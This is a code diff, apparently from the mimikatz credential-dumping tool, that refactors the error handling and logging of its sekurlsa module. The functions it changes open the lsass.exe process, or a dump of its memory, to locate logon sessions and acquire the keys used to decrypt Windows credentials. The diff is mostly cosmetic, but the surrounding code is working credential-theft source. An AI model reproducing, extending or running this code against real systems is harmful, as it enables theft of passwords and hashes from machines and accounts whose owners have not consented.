@@ -98,7 +98,7 @@ NTSTATUS kuhl_m_sekurlsa_process(int argc, wchar_t * argv[])
 
 NTSTATUS kuhl_m_sekurlsa_minidump(int argc, wchar_t * argv[])
 {
-	kprintf(L"Switch to MINIDUMP\n");
+	kprintf(L"Switch to MINIDUMP:");
 	if (argc != 1)
 	{
 		dprintf(L"[KIWI] <minidumpfile.dmp> argument is missing\n");
@@ -107,6 +107,7 @@ NTSTATUS kuhl_m_sekurlsa_minidump(int argc, wchar_t * argv[])
 	{
 		kuhl_m_sekurlsa_reset();
 		pMinidumpName = _wcsdup(argv[0]);
+		kprintf(L"\'%s\'\n", pMinidumpName);
 	}
 	return STATUS_SUCCESS;
 }
@@ -182,93 +183,94 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 	DWORD pid;
 	PMINIDUMP_SYSTEM_INFO pInfos;
 	DWORD processRights = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
+	BOOL isError = FALSE;
 
-	dprintf(L"[KIWI] Attempting to acquire LSA");
-
-	if(!cLsass.hLsassMem)
+	if (!cLsass.hLsassMem)
 	{
 		status = STATUS_NOT_FOUND;
-		if(NT_SUCCESS(lsassLocalHelper->initLocalLib()))
+		if (NT_SUCCESS(lsassLocalHelper->initLocalLib()))
 		{
-			if(pMinidumpName)
+			if (pMinidumpName)
 			{
 				Type = KULL_M_MEMORY_TYPE_PROCESS_DMP;
+				kprintf(L"Opening : \'%s\' file for minidump...\n", pMinidumpName);
 				hData = CreateFile(pMinidumpName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 			}
 			else
 			{
 				Type = KULL_M_MEMORY_TYPE_PROCESS;
-				if(kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
+				if (kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
 					hData = OpenProcess(processRights, FALSE, pid);
-				else dprintf(L"[KIWI] LSASS process not found (?)\n");
+				else PRINT_ERROR(L"LSASS process not found (?)\n");
 			}
 
-			if(hData && hData != INVALID_HANDLE_VALUE)
+			if (hData && hData != INVALID_HANDLE_VALUE)
 			{
-				if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
+				if (kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
 				{
-					if(Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)
+					if (Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)
 					{
-						if(pInfos = (PMINIDUMP_SYSTEM_INFO) kull_m_minidump_stream(cLsass.hLsassMem->pHandleProcessDmp->hMinidump, SystemInfoStream))
+						if (pInfos = (PMINIDUMP_SYSTEM_INFO)kull_m_minidump_stream(cLsass.hLsassMem->pHandleProcessDmp->hMinidump, SystemInfoStream))
 						{
 							cLsass.osContext.MajorVersion = pInfos->MajorVersion;
 							cLsass.osContext.MinorVersion = pInfos->MinorVersion;
-							cLsass.osContext.BuildNumber  = pInfos->BuildNumber;
+							cLsass.osContext.BuildNumber = pInfos->BuildNumber;
 
-							if(cLsass.osContext.MajorVersion != MIMIKATZ_NT_MAJOR_VERSION)
-							{
-								dprintf(L"[KIWI] Minidump pInfos->MajorVersion (%u) != MIMIKATZ_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, MIMIKATZ_NT_MAJOR_VERSION);
-							}
-						#ifdef _M_X64
-							if (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64)
-							{
-								dprintf(L"[KIWI] Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_AMD64);
-							}
-						#elif defined _M_IX86
-							if (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL)
-							{
-								dprintf(L"[KIWI] Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_INTEL (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_INTEL);
-							}
-						#endif
+							if (isError = (cLsass.osContext.MajorVersion != MIMIKATZ_NT_MAJOR_VERSION))
+								PRINT_ERROR(L"Minidump pInfos->MajorVersion (%u) != MIMIKATZ_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, MIMIKATZ_NT_MAJOR_VERSION);
+#ifdef _M_X64
+							else if (isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64))
+								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_AMD64);
+#elif defined _M_IX86
+							else if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL))
+								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_INTEL (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_INTEL);
+#endif
+
 						}
-						else dprintf(L"[KIWI] Minidump without SystemInfoStream (?)\n");
+						else
+						{
+							isError = TRUE;
+							PRINT_ERROR(L"Minidump without SystemInfoStream (?)\n");
+						}
 					}
 					else
 					{
 						cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
 						cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
-						cLsass.osContext.BuildNumber  = MIMIKATZ_NT_BUILD_NUMBER;
+						cLsass.osContext.BuildNumber = MIMIKATZ_NT_BUILD_NUMBER;
 					}
-					kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8);
-					kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion >= 6) || (cLsass.osContext.MinorVersion < 2);
 
-					if(NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent)
+					if (!isError)
 					{
-						kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module;
-						if(kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module))
+						kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8);
+						kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion >= 6) || (cLsass.osContext.MinorVersion < 2);
+
+						if (NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent)
 						{
-							status = lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages[0]->Module.Informations);
-
-							if (!NT_SUCCESS(status))
+							kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module;
+							if (kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module))
 							{
-								dprintf(L"[KIWI] Key import failed\n");
-							}
-						}
-						else dprintf(L"[KIWI] Logon list failed\n");
-					}
-					else dprintf(L"[KIWI] Modules informations failed\n");
-				}
-				else dprintf(L"[KIWI] Memory opening failed\n");
-			}
-			else dprintf(L"[KIWI] Handle of memory : %08x\n", GetLastError());
+								status = lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages[0]->Module.Informations);
 
-			if(!NT_SUCCESS(status))
+								if (!NT_SUCCESS(status))
+									PRINT_ERROR(L"Key import\n");
+							}
+							else PRINT_ERROR(L"Logon list\n");
+						}
+						else PRINT_ERROR(L"Modules informations\n");
+					}
+				}
+				else PRINT_ERROR(L"Memory opening\n");
+			}
+			else PRINT_ERROR_AUTO(L"Handle on memory");
+
+			if (!NT_SUCCESS(status))
 			{
 				cLsass.hLsassMem = kull_m_memory_close(cLsass.hLsassMem);
 				CloseHandle(hData);
 			}
 		}
-		else dprintf(L"[KIWI] Local LSA library failed\n");
+		else PRINT_ERROR(L"Local LSA library failed\n");
 	}
 	return status;
 }
